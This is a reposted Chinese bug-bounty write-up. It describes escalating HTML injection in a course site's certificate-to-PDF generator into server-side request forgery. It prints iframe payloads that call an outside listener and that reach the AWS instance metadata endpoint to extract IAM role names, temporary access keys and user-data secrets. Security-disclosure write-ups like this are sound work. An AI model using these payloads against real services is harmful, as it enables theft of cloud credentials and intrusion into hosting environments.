> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwOTE5MDY5NA==&mid=2247507010&idx=1&sn=e31106df9ba776f8fb560b1276961a0c

#  如何通过 PDF 渲染将简单的 HTML 注入升级为 SSRF  
haidragon  安全狗的自我修养   2025-07-18 04:07  
  
   
  
  
今天，我将带您了解我在一个私人漏洞赏金计划中发现的一个有趣漏洞，一个简单的 HTML 注入变成了具有AWS 凭证泄漏的全面**SSRF**。****  
  
拿上你的咖啡，我们开始吧！😉  
## 首先要做的事情……  
  
在测试一个
```
learn.target.com
```

托管在线课程的 .NET 网站的子域名时，我最初报告了几个低严重程度的错误。没什么特别的。我以为我已经完成了。  
  
但后来我意识到，我唯一还没研究过的部分就是课程系统本身。我注意到平台上有一些付费课程。其中一门是5美元的商务课程。我想，为了好好探索这个功能，这点钱花得还算值得。  
  
于是我付款后开始在内部测试。我尝试了各种常用方法，比如绕过付款、访问锁定的内容、检查IDOR以及查找暴露的资产。**但都无济于事。**  
  
最终我放弃了并转向其他目标。课程还不错，所以我继续学习，同时专注于不同的课程。  
  
几周后，完成课程后，我收到了这条消息：  
  
  
好吧，好吧，好吧……事情开始变得有点有趣了  
  
该网站为我提供了一个证书生成器来下载我的证书。  
  
一切就是从这里开始的。  
  
我离开了当前目标，以便更仔细地研究证书生成器功能。  
# 证书生成器功能  
  
该页面让您输入：  
- 您的**名字**  
- 您的**标题**  
- （可选）引用或留言  
然后单击**“生成”**，服务器将返回一个**PDF 或 PNG 文件，**其中包含您在漂亮的证书模板上的相关信息。  
  
请求主体看起来像这样：  
  
{  
  
"name"  
:  
  
"name"  
,  
  
"title"  
:  
  
"title"  
,  
  
"quote"  
:  
  
"quote "  
}  
  
一开始看起来很无辜。我得到了一张正常的图片。  
  
  
听起来很无辜，对吧？  
  
和往常一样，我首先测试了所有输入参数的注入情况。该
```
title
```

参数是没有经过输入过滤的参数。  
  
我用一个简单的 HTML 标签替换它：  
  
"title"  
:  
  
"<i>ahmed</i>"  
  
由于没有输入清理，HTML 有效负载在 pdf 和图像中都以斜体字体呈现。证书是这样的：  
  
  
我又尝试了几个：  
  
"title"  
:  
  
"<b>Red Team Member</b>"  

```
&#34;title&#34; : &#34;<iframe src='https://sub.0xxnum.fun/test'></iframe>&#34;
```

  
"title"  
:  
  
"<img src=x onerror=alert(1)>"  
  
令我惊讶的是：  
- 
```
<b>
```

并
```
<iframe>
```

  
 **呈现**  
  
- 
```
<script>
```

并且
```
onerror=
```

  
 **没有执行**  
  
这意味着我有**HTML 注入**，但**没有 XSS**。  
  
尽管如此，后端仍有一些东西在渲染 HTML。绝对值得深入挖掘。  
# 识别SSRF  
  
接下来，我想测试这个渲染过程是否真的会从中**获取资源**
```
iframe
```

。  
  
所以我修改了有效载荷：  
  
"title": "  
<  
iframe  
src  
=  
'http://sub.tarek.dev/probe'  
>  
</  
iframe  
>  
"  

```


```

  
并在我的终端（Burp Collaborator / Netcat / web 服务器）设置一个监听器。  
  
当我打开 PDF 时……  
  
  
我从 Web 应用程序服务器的 IP 地址收到了 DNS 和 HTTP 命中侦听器。  
  
现在我确认**服务器正在渲染 HTML 并从我们的输入加载 iframe 内容**。这是通过PDF 渲染流中的**HTML 注入进行的 SSRF 。**  
  
# 寻找 AWS 元数据  
  
存在 SSRF 是一回事，但证明其影响又是另一回事。由于服务器发出了出站 HTTP 请求，我怀疑它可能托管在**AWS**上——如果是这样，我希望能够访问**实例元数据服务 (IMDS)**。  
  
为了开始攻击，我注入了一个旨在访问元数据端点的新有效载荷：  

```
&#34;title&#34; : &#34;<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'></iframe>&#34;
```

  
生成的 PDF 包含 IAM 角色名称 my-app-instance-role，确认服务器正在启用 IMDSv1 的 AWS EC2 实例上运行。IMDSv1 尤其容易受到攻击，因为与 IMDSv2 不同，它不需要身份验证令牌。  
  
然后，我制作了另一个有效载荷来瞄准特定的 IAM 角色并泄露临时凭证：  

```
“title”：<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-instance-role'></iframe>&#34;
```

  
生成的 PDF 包含敏感数据，包括：  
- **访问密钥**  
- **秘密访问密钥**  
- **代币**  
这些是**临时的 AWS 凭证，**根据与该 IAM 角色绑定的权限，可以授予对其他 AWS 服务（如 S3、DynamoDB 等）的访问权限。  
  
  
除了 AWS 访问密钥之外，还要查看用户数据 IMDS 端点中是否有任何敏感数据  

```
http://169.254.169.254/latest/用户数据
```

  
该
```
user-data
```

部分通常包括引导脚本、环境变量，甚至是纯文本的硬编码秘密。  
## 到底发生了什么？  
  
这乍一看可能很奇怪。将 iframe 放入 PDF 中如何导致**服务器**发送 HTTP 请求？  
  
这就是答案。  
  
当我提交我的姓名、标题和引言时，服务器会构建证书的 HTML 版本并将其传递给渲染引擎（如
```
wkhtmltopdf
```

、
```
puppeteer
```

或其他无头浏览器工具）。这些工具会像普通浏览器一样处理完整的 HTML。这意味着它们会自动获取图像、iframe、样式表等，以便在将页面转换为 PDF 或 PNG 之前完全渲染页面。****  
  
因此，当您包含这个时：  

```
< iframe src = “http://169.254.169.254/latest/meta-data/” > </ iframe >
```

  
服务器上的渲染工具看到该 iframe 并尝试从该 IP 地址获取内容。由于是 AWS 元数据 IP，因此这会从云环境内部
```
169.254.169.254
```

变成 SSRF 。****  
  
您的输入不仅仅存在于 PDF 中——它会在最终文件创建之前被**处理和加载。**  
  
这是漏洞的核心。您正在滥用 HTML 注入，不是为了触发 JavaScript 或执行 XSS，而是为了通过呈现 iframe 或其他 HTML 标签来欺骗服务器发出内部 HTTP 请求。  
  
最终，该公司承认该问题严重性并获得了 1000 美元的赔偿  
  
  
感谢阅读！  
  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
-   
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
****  
  
  
